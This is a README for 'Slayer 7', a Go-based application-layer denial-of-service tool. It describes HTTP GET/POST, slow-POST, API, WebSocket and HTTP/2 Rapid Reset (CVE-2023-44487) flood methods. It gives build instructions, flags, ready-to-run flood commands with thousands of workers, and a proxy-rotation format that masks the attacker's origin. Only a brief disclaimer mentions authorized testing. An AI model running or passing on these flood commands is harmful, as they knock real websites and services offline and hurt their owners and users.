
# ⚔️ Slayer 7 - Application Layer Attack Suite

> A high-performance, multi-method HTTP/S stress testing tool written in **Go**.
Supports both HTTP and HTTPS, multiple attack vectors, proxy rotation, and massive concurrent worker pools.

---
> HTTP/2 Rapid-Reset Exploit 1M+ RPS
![Animation](https://github.com/user-attachments/assets/f33cb033-dfb6-4101-bdb5-507f2e5ad83e)

##  Methods

| Method       | Description                                                  |
| ------------ | ------------------------------------------------------------ |
| `httpget`    | Standard HTTP GET flood                                      |
| `httppost`   | HTTP POST with randomized form / JSON payloads               |
| `rudy`       | Slow POST — large `Content-Length`, drips bytes              |
| `apiflood`   | JSON API flood with randomized endpoints and nested payloads |
| `rapidreset` | HTTP/2 Rapid Reset (CVE-2023-44487)                          |
| `wsflood`    | WebSocket connection flood with mixed traffic                |

##  Installation

### Prerequisites

* **Go 1.21+**

### Quick Setup

```bash
git clone https://github.com/Syn2Much/Slayer-L7.git
cd Slayer-L7
go mod tidy
go build -o slayer .
```
---

##  Usage

```bash
slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile]
```

### Flags

| Flag | Default      | Description                             |
| ---- | ------------ | --------------------------------------- |
| `-t` | *(required)* | Target URL (e.g. `https://example.com`) |
| `-m` | `httpget`    | Attack method                           |
| `-w` | `2048`       | Number of concurrent workers            |
| `-d` | `30`         | Duration (seconds)                      |
| `-p` | *(none)*     | Proxy file path (omit for direct mode)  |

---


---
### Dependencies

```
github.com/gorilla/websocket
golang.org/x/net/http2
golang.org/x/net/http2/hpack
```

##  Examples

```bash
# Basic GET flood (60s)
./slayer -t https://target.com -m httpget -d 60

# POST flood via proxies (4096 workers)
./slayer -t https://target.com -m httppost -w 4096 -d 120 -p proxies.txt

# RUDY slow POST
./slayer -t https://target.com -m rudy -w 500 -d 300

# HTTP/2 Rapid Reset via proxies
./slayer -t https://target.com -m rapidreset -w 1024 -p proxies.txt

# WebSocket flood
./slayer -t https://target.com -m wsflood -w 2048 -d 60

# API JSON flood
./slayer -t https://target.com -m apiflood -w 2048 -d 90
```

---

##  Proxy File Format

One proxy per line.
Supports HTTP / HTTPS / SOCKS5 with optional authentication.

```
http://proxy1.example.com:8080
http://user:pass@proxy2.example.com:3128
socks5://proxy3.example.com:1080
```
---
> **⚠️ Disclaimer**
> This tool is intended **only** for authorized security testing and research.
> Use **only** against systems you own or have **explicit written permission** to test.
> Unauthorized use is illegal.
 
## 👤 Author

**Syn2Much**

[![Email](https://img.shields.io/badge/Email-dev%40sinnners.city-red?style=flat-square&logo=gmail)](mailto:dev@sinnners.city)
[![X](https://img.shields.io/badge/@synacket-black?style=flat-square&logo=x)](https://x.com/synacket)
